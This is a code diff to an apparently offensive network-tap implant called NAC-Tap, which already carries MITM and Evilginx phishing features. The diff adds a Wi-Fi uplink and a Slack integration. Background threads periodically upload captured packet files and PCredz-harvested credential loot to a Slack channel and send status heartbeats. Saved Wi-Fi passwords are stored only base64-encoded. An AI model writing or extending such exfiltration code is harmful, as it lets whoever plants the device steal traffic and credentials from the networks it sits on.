@@ -40,6 +40,20 @@ CONFIG = {
     'ANALYSIS_INTERVAL': 300,  # Seconds between automated loot scans
     'MITM_ENABLED': False,
     'REMOTE_ATTACKER_IP': None,
+    'UPLOAD_ENABLED': False,
+    'UPLOAD_INTERVAL': 60,
+    'HEARTBEAT_INTERVAL': 15,
+    'SLACK_WEBHOOK_URL': None,
+    'SLACK_BOT_TOKEN': None,
+    'SLACK_CHANNEL': None,
+    'WIFI_INTERFACE': None,
+    'WIFI_SSID': None,
+    'WIFI_PASSWORD': None,
+    'WIFI_CONNECTED': False,
+    'APPLIANCE_ID': None,
+    'CONFIG_FILE': '/var/log/nac-captures/upload-config.json',
+    'UPLOAD_PCAP': True,
+    'UPLOAD_PCREDZ': True,
 }
 
 # Core protocols for interception (focused list)
@@ -1269,6 +1283,422 @@ phishlets enable {phishlet}
         log("Evilginx sessions cleared")
 
 # ============================================================================
+# WIFI MANAGER
+# ============================================================================
+
+class WiFiManager:
+    """Manages WiFi AP connection and scanning"""
+
+    def __init__(self):
+        self.interface = None
+        self.ssid = None
+        self.password = None
+        self.connected = False
+        self.scan_results = []
+        self.ip_address = None
+        self.gateway = None
+        self.internet_available = False
+
+    def get_wifi_interfaces(self):
+        """Get available WLAN interfaces"""
+        interfaces = []
+        result = run_cmd(['ip', '-o', 'link', 'show'])
+        if result and result.returncode == 0:
+            for line in result.stdout.split('\n'):
+                if 'wlan' in line.lower() or 'wlp' in line.lower():
+                    parts = line.split(':')
+                    if len(parts) >= 2:
+                        iface = parts[1].strip().split('@')[0]
+                        if iface not in interfaces:
+                            interfaces.append(iface)
+        return interfaces
+
+    def scan_aps(self, interface):
+        """Scan for available access points"""
+        self.scan_results = []
+        try:
+            # Try nmcli first (NetworkManager)
+            result = run_cmd(['nmcli', '-t', '-f', 'SSID,SIGNAL,SECURITY,CHAN', 'device', 'wifi', 'list', 'ifname', interface], timeout=15)
+            if result and result.returncode == 0:
+                for line in result.stdout.strip().split('\n'):
+                    if not line:
+                        continue
+                    parts = line.split(':')
+                    if len(parts) >= 4:
+                        ssid = parts[0]
+                        signal = int(parts[1]) if parts[1].isdigit() else -100
+                        security = parts[2] if parts[2] else 'Open'
+                        channel = parts[3] if len(parts) > 3 and parts[3] else '0'
+                        self.scan_results.append({
+                            'ssid': ssid,
+                            'signal': signal,
+                            'security': security,
+                            'channel': channel
+                        })
+                return self.scan_results
+            else:
+                # Fallback to iwlist
+                result = run_cmd(['iwlist', interface, 'scan'], timeout=15)
+                if result and result.returncode == 0:
+                    current_ap = {}
+                    for line in result.stdout.split('\n'):
+                        line = line.strip()
+                        if 'ESSID:' in line:
+                            if current_ap:
+                                self.scan_results.append(current_ap)
+                            current_ap = {'ssid': line.split('ESSID:')[1].strip().strip('"')}
+                        elif 'Signal level=' in line:
+                            sig_match = re.search(r'Signal level=(-?\d+)', line)
+                            if sig_match:
+                                current_ap['signal'] = int(sig_match.group(1))
+                        elif 'Encryption key:' in line:
+                            current_ap['security'] = 'WPA2' if 'on' in line else 'Open'
+                        elif 'Channel:' in line:
+                            ch_match = re.search(r'Channel:(\d+)', line)
+                            if ch_match:
+                                current_ap['channel'] = ch_match.group(1)
+                    if current_ap:
+                        self.scan_results.append(current_ap)
+        except Exception as e:
+            log(f"AP scan failed: {e}", 'ERROR')
+        return self.scan_results
+
+    def connect_to_ap(self, interface, ssid, password=None):
+        """Connect to WiFi AP"""
+        try:
+            self.interface = interface
+            self.ssid = ssid
+            self.password = password
+            
+            # Try nmcli first
+            if password:
+                result = run_cmd(['nmcli', 'device', 'wifi', 'connect', ssid, 'password', password, 'ifname', interface], timeout=30)
+            else:
+                result = run_cmd(['nmcli', 'device', 'wifi', 'connect', ssid, 'ifname', interface], timeout=30)
+            
+            if result and result.returncode == 0:
+                time.sleep(3)
+                # Get IP address
+                result = run_cmd(['ip', 'addr', 'show', interface])
+                if result:
+                    ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/\d+', result.stdout)
+                    if ip_match:
+                        self.ip_address = ip_match.group(1)
+                
+                # Get gateway
+                result = run_cmd(['ip', 'route', 'show', 'default'])
+                if result:
+                    gw_match = re.search(r'default via (\d+\.\d+\.\d+\.\d+)', result.stdout)
+                    if gw_match:
+                        self.gateway = gw_match.group(1)
+                
+                self.connected = True
+                # Test internet
+                self.internet_available = self.test_internet_connectivity()['connected']
+                return {'success': True, 'connected': True, 'internet': self.test_internet_connectivity()}
+            else:
+                error = result.stderr if result else "Unknown error"
+                log(f"WiFi connection failed: {error}", 'ERROR')
+                return {'success': False, 'error': error}
+        except Exception as e:
+            log(f"WiFi connection error: {e}", 'ERROR')
+            return {'success': False, 'error': str(e)}
+
+    def disconnect_wifi(self):
+        """Disconnect from WiFi"""
+        try:
+            if self.interface:
+                run_cmd(['nmcli', 'device', 'disconnect', self.interface])
+            self.connected = False
+            self.ip_address = None
+            self.gateway = None
+            self.internet_available = False
+            return True
+        except Exception as e:
+            log(f"WiFi disconnect error: {e}", 'ERROR')
+            return False
+
+    def test_internet_connectivity(self):
+        """Test internet connectivity"""
+        ping_ok = False
+        dns_ok = False
+        
+        # Test ping
+        result = run_cmd(['ping', '-c', '2', '-W', '3', '8.8.8.8'], timeout=8)
+        if result and result.returncode == 0:
+            ping_ok = True
+        
+        # Test DNS
+        result = run_cmd(['nslookup', 'google.com'], timeout=5)
+        if result and result.returncode == 0:
+            dns_ok = True
+        
+        connected = ping_ok and dns_ok
+        self.internet_available = connected
+        return {'ping': ping_ok, 'dns': dns_ok, 'connected': connected}
+
+    def get_connection_status(self):
+        """Get current WiFi status"""
+        return {
+            'connected': self.connected,
+            'interface': self.interface,
+            'ssid': self.ssid,
+            'ip_address': self.ip_address,
+            'gateway': self.gateway,
+            'internet_available': self.internet_available
+        }
+
+# ============================================================================
+# SLACK MANAGER
+# ============================================================================
+
+class SlackManager:
+    """Manages Slack API integration for uploads and heartbeats"""
+
+    def __init__(self, bridge_manager=None):
+        self.webhook_url = None
+        self.bot_token = None
+        self.channel = None
+        self.enabled = False
+        self.upload_thread = None
+        self.heartbeat_thread = None
+        self.stop_threads = False
+        self.last_upload_time = None
+        self.last_heartbeat_time = None
+        self.upload_history = []
+        self.bridge_manager = bridge_manager
+        self.appliance_id = None
+        self.upload_pcap = True
+        self.upload_pcredz = True
+        self._init_appliance_id()
+
+    def _init_appliance_id(self):
+        """Initialize appliance ID"""
+        import socket
+        import uuid
+        try:
+            hostname = socket.gethostname()
+            self.appliance_id = f"{hostname}-{str(uuid.uuid4())[:8]}"
+            CONFIG['APPLIANCE_ID'] = self.appliance_id
+        except:
+            self.appliance_id = f"nac-tap-{str(uuid.uuid4())[:8]}"
+            CONFIG['APPLIANCE_ID'] = self.appliance_id
+
+    def test_webhook_connection(self, webhook_url):
+        """Test Slack webhook URL"""
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            data = json.dumps({'text': 'NAC-Tap test message'}).encode('utf-8')
+            req = urllib.request.Request(webhook_url, data=data, headers={'Content-Type': 'application/json'})
+            with urllib.request.urlopen(req, timeout=10) as response:
+                if response.status == 200:
+                    return {'success': True, 'message': 'Webhook test successful'}
+                else:
+                    return {'success': False, 'error': f'HTTP {response.status}'}
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+
+    def test_bot_token(self, bot_token):
+        """Test Slack bot token"""
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            url = 'https://slack.com/api/auth.test'
+            data = urllib.parse.urlencode({'token': bot_token}).encode('utf-8')
+            req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+            with urllib.request.urlopen(req, timeout=10) as response:
+                result = json.loads(response.read().decode('utf-8'))
+                if result.get('ok'):
+                    return {'success': True, 'bot_info': {'user_id': result.get('user_id'), 'team': result.get('team')}}
+                else:
+                    return {'success': False, 'error': result.get('error', 'Unknown error')}
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+
+    def send_heartbeat(self):
+        """Send heartbeat message to Slack"""
+        if not self.webhook_url or not self.enabled:
+            return
+        
+        try:
+            import urllib.request
+            
+            status = 'online'
+            capture_active = 'no'
+            pcap_size = '0 B'
+            
+            if self.bridge_manager:
+                if self.bridge_manager.tcpdump_process and self.bridge_manager.tcpdump_process.poll() is None:
+                    capture_active = 'yes'
+                    if self.bridge_manager.pcap_file and os.path.exists(self.bridge_manager.pcap_file):
+                        size = os.path.getsize(self.bridge_manager.pcap_file)
+                        pcap_size = f"{size / 1024 / 1024:.2f} MB"
+            
+            message = {
+                'text': f"NAC-Tap Heartbeat\nAppliance: {self.appliance_id}\nStatus: {status}\nLast Poll: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nCapture Active: {capture_active}\nPCAP Size: {pcap_size}",
+                'username': 'NAC-Tap'
+            }
+            
+            data = json.dumps(message).encode('utf-8')
+            req = urllib.request.Request(self.webhook_url, data=data, headers={'Content-Type': 'application/json'})
+            with urllib.request.urlopen(req, timeout=10) as response:
+                if response.status == 200:
+                    self.last_heartbeat_time = datetime.now().isoformat()
+                    return True
+        except Exception as e:
+            log(f"Heartbeat failed: {e}", 'ERROR')
+        return False
+
+    def upload_file(self, file_path, title=None):
+        """Upload file to Slack"""
+        if not self.bot_token or not self.channel:
+            return {'success': False, 'error': 'Bot token or channel not configured'}
+        
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            if not os.path.exists(file_path):
+                return {'success': False, 'error': 'File not found'}
+            
+            url = 'https://slack.com/api/files.upload'
+            
+            with open(file_path, 'rb') as f:
+                file_data = f.read()
+            
+            boundary = '----WebKitFormBoundary' + ''.join([str(i) for i in range(10)])
+            body_parts = []
+            body_parts.append(f'--{boundary}'.encode())
+            body_parts.append(f'Content-Disposition: form-data; name="token"\r\n\r\n{self.bot_token}'.encode())
+            body_parts.append(f'--{boundary}'.encode())
+            body_parts.append(f'Content-Disposition: form-data; name="channels"\r\n\r\n{self.channel}'.encode())
+            body_parts.append(f'--{boundary}'.encode())
+            body_parts.append(f'Content-Disposition: form-data; name="file"; filename="{os.path.basename(file_path)}"\r\nContent-Type: application/octet-stream\r\n\r\n'.encode())
+            body_parts.append(file_data)
+            body_parts.append(f'--{boundary}--'.encode())
+            
+            body = b'\r\n'.join(body_parts)
+            
+            req = urllib.request.Request(url, data=body)
+            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
+            
+            with urllib.request.urlopen(req, timeout=60) as response:
+                result = json.loads(response.read().decode('utf-8'))
+                if result.get('ok'):
+                    return {'success': True, 'file_url': result.get('file', {}).get('url_private')}
+                else:
+                    return {'success': False, 'error': result.get('error', 'Unknown error')}
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+
+    def upload_capture_data(self):
+        """Upload PCAP and loot files to Slack"""
+        if not self.enabled or not self.bot_token or not self.channel:
+            return
+        
+        # Check internet connectivity
+        if self.bridge_manager and self.bridge_manager.wifi_manager:
+            if not self.bridge_manager.wifi_manager.internet_available:
+                log("Skipping upload - internet not available", 'WARNING')
+                return
+        
+        uploaded_files = []
+        
+        # Upload PCAP (if enabled)
+        if self.upload_pcap and self.bridge_manager and self.bridge_manager.pcap_file and os.path.exists(self.bridge_manager.pcap_file):
+            result = self.upload_file(self.bridge_manager.pcap_file, 'PCAP Capture')
+            if result.get('success'):
+                uploaded_files.append(f"PCAP: {os.path.basename(self.bridge_manager.pcap_file)}")
+            else:
+                log(f"PCAP upload failed: {result.get('error')}", 'ERROR')
+        
+        # Upload PCredz output (if enabled)
+        if self.upload_pcredz:
+            loot_file = CONFIG['LOOT_FILE']
+            if os.path.exists(loot_file):
+                result = self.upload_file(loot_file, 'Loot JSON')
+                if result.get('success'):
+                    uploaded_files.append(f"Loot: {os.path.basename(loot_file)}")
+            
+            # Upload raw PCredz output
+            raw_file = loot_file.replace('.json', '_raw.txt')
+            if os.path.exists(raw_file):
+                result = self.upload_file(raw_file, 'PCredz Raw Output')
+                if result.get('success'):
+                    uploaded_files.append(f"Raw: {os.path.basename(raw_file)}")
+        
+        # Send summary message
+        if uploaded_files and self.webhook_url:
+            try:
+                import urllib.request
+                message = {
+                    'text': f"NAC-Tap Upload Complete\nAppliance: {self.appliance_id}\nFiles uploaded:\n" + '\n'.join([f"- {f}" for f in uploaded_files]),
+                    'username': 'NAC-Tap'
+                }
+                data = json.dumps(message).encode('utf-8')
+                req = urllib.request.Request(self.webhook_url, data=data, headers={'Content-Type': 'application/json'})
+                urllib.request.urlopen(req, timeout=10)
+            except:
+                pass
+        
+        self.last_upload_time = datetime.now().isoformat()
+        self.upload_history.append({
+            'time': self.last_upload_time,
+            'files': uploaded_files,
+            'success': len(uploaded_files) > 0
+        })
+        if len(self.upload_history) > 10:
+            self.upload_history.pop(0)
+
+    def _heartbeat_loop(self):
+        """Heartbeat thread loop"""
+        while not self.stop_threads:
+            if self.enabled and self.webhook_url:
+                self.send_heartbeat()
+            time.sleep(CONFIG.get('HEARTBEAT_INTERVAL', 15))
+
+    def _upload_loop(self):
+        """Upload thread loop"""
+        while not self.stop_threads:
+            if self.enabled:
+                self.upload_capture_data()
+            time.sleep(CONFIG.get('UPLOAD_INTERVAL', 60))
+
+    def start_auto_upload(self):
+        """Start automatic upload and heartbeat threads"""
+        if self.enabled:
+            return
+        self.enabled = True
+        self.stop_threads = False
+        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
+        self.upload_thread = threading.Thread(target=self._upload_loop, daemon=True)
+        self.heartbeat_thread.start()
+        self.upload_thread.start()
+        log("Slack auto-upload started")
+
+    def stop_auto_upload(self):
+        """Stop automatic upload and heartbeat threads"""
+        self.enabled = False
+        self.stop_threads = True
+        if self.heartbeat_thread:
+            self.heartbeat_thread.join(timeout=2)
+        if self.upload_thread:
+            self.upload_thread.join(timeout=2)
+        log("Slack auto-upload stopped")
+
+    def get_upload_status(self):
+        """Get upload status"""
+        return {
+            'enabled': self.enabled,
+            'last_upload_time': self.last_upload_time,
+            'last_heartbeat_time': self.last_heartbeat_time,
+            'upload_history': self.upload_history[-10:]
+        }
+
+# ============================================================================
 # INTERNET ROUTING HELPER
 # ============================================================================
 
@@ -1439,12 +1869,17 @@ class BridgeManager:
         self.mitm_manager = MITMManager()
         self.evilginx_manager = EvilginxManager()
         self.evilginx_manager.load_sessions()
+        self.wifi_manager = WiFiManager()
+        self.slack_manager = SlackManager(bridge_manager=self)
         self.bridge_initialized = False
         self.client_ip = None
         self.gateway_ip = None
         self.analysis_interval = CONFIG.get('ANALYSIS_INTERVAL', 300)
         self.stop_monitoring = False
         self.monitor_thread = None
+        self.auto_connect_wifi = False
+        self.auto_enable_upload = False
+        self.load_saved_config()
 
     def detect_interfaces(self):
         """Detect ethernet interfaces (not wireless)"""
@@ -1772,7 +2207,9 @@ class BridgeManager:
             'gateway_ip': self.gateway_ip,
             'logs': self._get_logs(),
             'mitm': self.mitm_manager.get_status(),
-            'evilginx': self.evilginx_manager.get_status()
+            'evilginx': self.evilginx_manager.get_status(),
+            'wifi': self.wifi_manager.get_connection_status(),
+            'slack': self.slack_manager.get_upload_status()
         }
 
         if self.tcpdump_process and self.tcpdump_process.poll() is None:
@@ -1853,6 +2290,104 @@ class BridgeManager:
                     f.write(f'START_TIME="{self.start_time}"\n')
         except Exception:
             pass
+
+    def save_config(self):
+        """Save WiFi and Slack configuration to file"""
+        try:
+            import base64
+            config_data = {
+                'wifi': {
+                    'interface': self.wifi_manager.interface,
+                    'ssid': self.wifi_manager.ssid,
+                    'password': base64.b64encode(self.wifi_manager.password.encode()).decode() if self.wifi_manager.password else None,
+                    'auto_connect': self.auto_connect_wifi
+                },
+                'slack': {
+                    'webhook_url': self.slack_manager.webhook_url,
+                    'bot_token': self.slack_manager.bot_token,
+                    'channel': self.slack_manager.channel,
+                    'auto_upload': self.auto_enable_upload,
+                    'upload_pcap': self.slack_manager.upload_pcap,
+                    'upload_pcredz': self.slack_manager.upload_pcredz
+                },
+                'last_saved': datetime.now().isoformat()
+            }
+            
+            os.makedirs(os.path.dirname(CONFIG['CONFIG_FILE']), exist_ok=True)
+            with open(CONFIG['CONFIG_FILE'], 'w') as f:
+                json.dump(config_data, f, indent=2)
+            os.chmod(CONFIG['CONFIG_FILE'], 0o600)
+            log("Configuration saved")
+            return True
+        except Exception as e:
+            log(f"Failed to save config: {e}", 'ERROR')
+            return False
+
+    def load_saved_config(self):
+        """Load saved configuration from file"""
+        try:
+            import base64
+            if not os.path.exists(CONFIG['CONFIG_FILE']):
+                return False
+            
+            with open(CONFIG['CONFIG_FILE'], 'r') as f:
+                config_data = json.load(f)
+            
+            # Load WiFi config
+            if 'wifi' in config_data:
+                wifi_cfg = config_data['wifi']
+                self.wifi_manager.interface = wifi_cfg.get('interface')
+                self.wifi_manager.ssid = wifi_cfg.get('ssid')
+                if wifi_cfg.get('password'):
+                    self.wifi_manager.password = base64.b64decode(wifi_cfg['password']).decode()
+                self.auto_connect_wifi = wifi_cfg.get('auto_connect', False)
+                CONFIG['WIFI_INTERFACE'] = wifi_cfg.get('interface')
+                CONFIG['WIFI_SSID'] = wifi_cfg.get('ssid')
+                CONFIG['WIFI_PASSWORD'] = self.wifi_manager.password
+            
+            # Load Slack config
+            if 'slack' in config_data:
+                slack_cfg = config_data['slack']
+                self.slack_manager.webhook_url = slack_cfg.get('webhook_url')
+                self.slack_manager.bot_token = slack_cfg.get('bot_token')
+                self.slack_manager.channel = slack_cfg.get('channel')
+                self.auto_enable_upload = slack_cfg.get('auto_upload', False)
+                self.slack_manager.upload_pcap = slack_cfg.get('upload_pcap', True)
+                self.slack_manager.upload_pcredz = slack_cfg.get('upload_pcredz', True)
+                CONFIG['SLACK_WEBHOOK_URL'] = slack_cfg.get('webhook_url')
+                CONFIG['SLACK_BOT_TOKEN'] = slack_cfg.get('bot_token')
+                CONFIG['SLACK_CHANNEL'] = slack_cfg.get('channel')
+                CONFIG['UPLOAD_PCAP'] = self.slack_manager.upload_pcap
+                CONFIG['UPLOAD_PCREDZ'] = self.slack_manager.upload_pcredz
+            
+            # Apply auto-connect/auto-upload if enabled
+            if self.auto_connect_wifi and self.wifi_manager.interface and self.wifi_manager.ssid:
+                log("Auto-connecting to WiFi...")
+                self.wifi_manager.connect_to_ap(self.wifi_manager.interface, self.wifi_manager.ssid, self.wifi_manager.password)
+            
+            if self.auto_enable_upload and self.slack_manager.webhook_url and self.slack_manager.bot_token and self.slack_manager.channel:
+                log("Auto-enabling Slack upload...")
+                self.slack_manager.start_auto_upload()
+            
+            log("Configuration loaded")
+            return True
+        except Exception as e:
+            log(f"Failed to load config: {e}", 'ERROR')
+            return False
+
+    def apply_saved_config(self):
+        """Apply saved configuration (connect WiFi, enable upload)"""
+        result = {'wifi_connected': False, 'upload_enabled': False}
+        
+        if self.auto_connect_wifi and self.wifi_manager.interface and self.wifi_manager.ssid:
+            conn_result = self.wifi_manager.connect_to_ap(self.wifi_manager.interface, self.wifi_manager.ssid, self.wifi_manager.password)
+            result['wifi_connected'] = conn_result.get('success', False)
+        
+        if self.auto_enable_upload and self.slack_manager.webhook_url and self.slack_manager.bot_token and self.slack_manager.channel:
+            self.slack_manager.start_auto_upload()
+            result['upload_enabled'] = True
+        
+        return result
 
     def _get_interfaces(self):
         """Get all network interfaces"""
@@ -2010,6 +2545,34 @@ class NACWebHandler(BaseHTTPRequestHandler):
                 log(f"Test page error: {e}", 'ERROR')
                 self.send_error(404, f"Test page error: {e}")
         
+        # WiFi endpoints
+        elif path == '/api/wifi/interfaces':
+            interfaces = self.bridge_manager.wifi_manager.get_wifi_interfaces()
+            self._send_json({'interfaces': interfaces})
+        elif path == '/api/wifi/scan/results':
+            self._send_json({'aps': self.bridge_manager.wifi_manager.scan_results})
+        elif path == '/api/wifi/status':
+            self._send_json(self.bridge_manager.wifi_manager.get_connection_status())
+        elif path == '/api/upload/status':
+            self._send_json(self.bridge_manager.slack_manager.get_upload_status())
+        elif path == '/api/config/load':
+            config_data = {
+                'wifi': {
+                    'interface': self.bridge_manager.wifi_manager.interface,
+                    'ssid': self.bridge_manager.wifi_manager.ssid,
+                    'auto_connect': self.bridge_manager.auto_connect_wifi
+                },
+                'slack': {
+                    'webhook_url': self.bridge_manager.slack_manager.webhook_url,
+                    'bot_token': self.bridge_manager.slack_manager.bot_token,
+                    'channel': self.bridge_manager.slack_manager.channel,
+                    'auto_upload': self.bridge_manager.auto_enable_upload,
+                    'upload_pcap': self.bridge_manager.slack_manager.upload_pcap,
+                    'upload_pcredz': self.bridge_manager.slack_manager.upload_pcredz
+                }
+            }
+            self._send_json(config_data)
+        
         else:
             self.send_error(404)
 
@@ -2151,6 +2714,149 @@ class NACWebHandler(BaseHTTPRequestHandler):
         elif path == '/api/evilginx/clear_sessions':
             self.bridge_manager.evilginx_manager.clear_sessions()
             self._send_json({'success': True})
+        
+        # WiFi endpoints
+        elif path == '/api/wifi/scan':
+            try:
+                content_length = int(self.headers.get('Content-Length', 0))
+                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
+                data = json.loads(body) if body else {}
+                interface = data.get('interface')
+                if interface:
+                    aps = self.bridge_manager.wifi_manager.scan_aps(interface)
+                    self._send_json({'success': True, 'aps': aps})
+                else:
+                    self._send_json({'success': False, 'error': 'Interface required'})
+            except Exception as e:
+                self._send_json({'success': False, 'error': str(e)})
+        
+        elif path == '/api/wifi/connect':
+            try:
+                content_length = int(self.headers.get('Content-Length', 0))
+                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
+                data = json.loads(body) if body else {}
+                result = self.bridge_manager.wifi_manager.connect_to_ap(
+                    data.get('interface'),
+                    data.get('ssid'),
+                    data.get('password')
+                )
+                self._send_json(result)
+            except Exception as e:
+                self._send_json({'success': False, 'error': str(e)})
+        
+        elif path == '/api/wifi/disconnect':
+            result = self.bridge_manager.wifi_manager.disconnect_wifi()
+            self._send_json({'success': result})
+        
+        elif path == '/api/wifi/test':
+            result = self.bridge_manager.wifi_manager.test_internet_connectivity()
+            self._send_json(result)
+        
+        # Slack endpoints
+        elif path == '/api/slack/test/webhook':
+            try:
+                content_length = int(self.headers.get('Content-Length', 0))
+                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
+                data = json.loads(body) if body else {}
+                result = self.bridge_manager.slack_manager.test_webhook_connection(data.get('webhook_url'))
+                self._send_json(result)
+            except Exception as e:
+                self._send_json({'success': False, 'error': str(e)})
+        
+        elif path == '/api/slack/test/token':
+            try:
+                content_length = int(self.headers.get('Content-Length', 0))
+                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
+                data = json.loads(body) if body else {}
+                result = self.bridge_manager.slack_manager.test_bot_token(data.get('bot_token'))
+                self._send_json(result)
+            except Exception as e:
+                self._send_json({'success': False, 'error': str(e)})
+        
+        elif path == '/api/slack/test/integration':
+            try:
+                content_length = int(self.headers.get('Content-Length', 0))
+                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
+                data = json.loads(body) if body else {}
+                webhook_result = self.bridge_manager.slack_manager.test_webhook_connection(data.get('webhook_url'))
+                token_result = self.bridge_manager.slack_manager.test_bot_token(data.get('bot_token'))
+                self._send_json({
+                    'success': webhook_result.get('success') and token_result.get('success'),
+                    'webhook': webhook_result.get('success'),
+                    'token': token_result.get('success')
+                })
+            except Exception as e:
+                self._send_json({'success': False, 'error': str(e)})
+        
+        elif path == '/api/slack/configure':
+            try:
+                content_length = int(self.headers.get('Content-Length', 0))
+                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
+                data = json.loads(body) if body else {}
+                self.bridge_manager.slack_manager.webhook_url = data.get('webhook_url')
+                self.bridge_manager.slack_manager.bot_token = data.get('bot_token')
+                self.bridge_manager.slack_manager.channel = data.get('channel')
+                self._send_json({'success': True})
+            except Exception as e:
+                self._send_json({'success': False, 'error': str(e)})
+        
+        elif path == '/api/upload/enable':
+            try:
+                content_length = int(self.headers.get('Content-Length', 0))
+                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
+                data = json.loads(body) if body else {}
+                enabled = data.get('enabled', True)
+                upload_pcap = data.get('upload_pcap')
+                upload_pcredz = data.get('upload_pcredz')
+                if upload_pcap is not None:
+                    self.bridge_manager.slack_manager.upload_pcap = upload_pcap
+                if upload_pcredz is not None:
+                    self.bridge_manager.slack_manager.upload_pcredz = upload_pcredz
+                if enabled:
+                    self.bridge_manager.slack_manager.start_auto_upload()
+                else:
+                    self.bridge_manager.slack_manager.stop_auto_upload()
+                self._send_json({'success': True})
+            except Exception as e:
+                self._send_json({'success': False, 'error': str(e)})
+        
+        elif path == '/api/upload/trigger':
+            self.bridge_manager.slack_manager.upload_capture_data()
+            self._send_json({'success': True})
+        
+        # Config endpoints
+        elif path == '/api/config/save':
+            try:
+                content_length = int(self.headers.get('Content-Length', 0))
+                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
+                data = json.loads(body) if body else {}
+                
+                # Update WiFi settings
+                if 'wifi' in data:
+                    wifi_cfg = data['wifi']
+                    self.bridge_manager.wifi_manager.interface = wifi_cfg.get('interface')
+                    self.bridge_manager.wifi_manager.ssid = wifi_cfg.get('ssid')
+                    self.bridge_manager.wifi_manager.password = wifi_cfg.get('password')
+                    self.bridge_manager.auto_connect_wifi = wifi_cfg.get('auto_connect', False)
+                
+                # Update Slack settings
+                if 'slack' in data:
+                    slack_cfg = data['slack']
+                    self.bridge_manager.slack_manager.webhook_url = slack_cfg.get('webhook_url')
+                    self.bridge_manager.slack_manager.bot_token = slack_cfg.get('bot_token')
+                    self.bridge_manager.slack_manager.channel = slack_cfg.get('channel')
+                    self.bridge_manager.auto_enable_upload = slack_cfg.get('auto_upload', False)
+                    self.bridge_manager.slack_manager.upload_pcap = slack_cfg.get('upload_pcap', True)
+                    self.bridge_manager.slack_manager.upload_pcredz = slack_cfg.get('upload_pcredz', True)
+                
+                result = self.bridge_manager.save_config()
+                self._send_json({'success': result})
+            except Exception as e:
+                self._send_json({'success': False, 'error': str(e)})
+        
+        elif path == '/api/config/apply':
+            result = self.bridge_manager.apply_saved_config()
+            self._send_json({'success': True, **result})
         
         else:
             self.send_error(404)
